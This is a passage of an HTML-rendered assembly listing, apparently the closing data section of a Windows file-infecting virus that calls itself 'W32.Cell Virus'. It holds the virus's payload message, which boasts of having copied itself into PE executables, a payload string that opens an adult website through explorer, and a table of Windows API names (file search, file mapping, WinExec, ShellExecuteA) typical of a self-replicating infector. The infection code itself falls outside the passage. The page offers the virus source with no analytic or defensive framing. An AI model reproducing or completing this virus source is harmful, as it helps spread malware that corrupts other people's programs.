</span><span class="sc5">Reserved0</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved1</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc5">max_path</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">AlternateFileName</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">SearchStruc</span><span class="sc0"> </span><span class="sc5">win32_find_data</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;*********************payload stuff*********************</span><span class="sc0">
</span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">wYear</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMonth</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WDayOfWeek</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Wday</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WHour</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WMinute</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WSecond</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WMilliseconds</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">TimeStruc</span><span class="sc0">  </span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">WinTitle</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'W32.Cell Virus'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">msg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'My evolution is complete'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Cell is born anew into the Win OS'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'take a hex editor and open some PE  Exes'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'and look at the end of the file'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'why? because youll laugh'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'why? because Cell is in them'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'under your nose i have made more akin to me!'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Cell Virus '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">URL</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'explorer    http://www.sexsearch.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;********************** API RELATED DATA******************</span><span class="sc0">
</span><span class="sc5">APIS</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ApiIneed</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">ACreateFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AExitProcess</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; is about to use</span><span class="sc0">
</span><span class="sc5">AFindFirstFileA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AFindNextFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ACreateFileMapping</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AMapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AUnmapViewOfFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetFileAttributes</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetFileAttributes</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetDriveType</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDriveTypeA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ACloseHandle</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetFileTime</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetFileTime</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetFilePointer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetFileSize</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetEndOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetSystemTime</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetModuleHandle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">AGetLastError</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetLastErrorA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ALoadLibrary</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AWinExec</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WinExec'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">APIS2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">AGetProcAddress</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACreateFileAA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">AExitProcessA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AFindFirstFileAA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AFindNextFileAA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ACreateFileMappingA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AMapViewOfFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AUnmapViewOfFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetDriveTypeA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ACloseHandleA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetFileTimeA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetFileTimeA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetFilePointerA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetFileSizeA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ASetEndOfFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetSystemTimeA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AGetModuleHandleA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">AGetLastErrorA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ALoadLibraryA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AWinExecA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">apicheck</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">kernel</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         

</span><span class="sc5">AMsgBox</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AMsgBoxA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">shelldll</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'shell32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">shellex</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ShellExecuteA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         

</span><span class="sc5">userbase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          
</span><span class="sc5">userdll</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"user32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AShellExecute</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">export</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BaseFunctions</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">NamingIndex</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">AddressofFunctions</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AddressOfNames</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AddressOfNameOrdinals</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">NumberNames</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;************************************** api data ends***</span><span class="sc0">
</span><span class="sc5">endgame</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0"> 
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
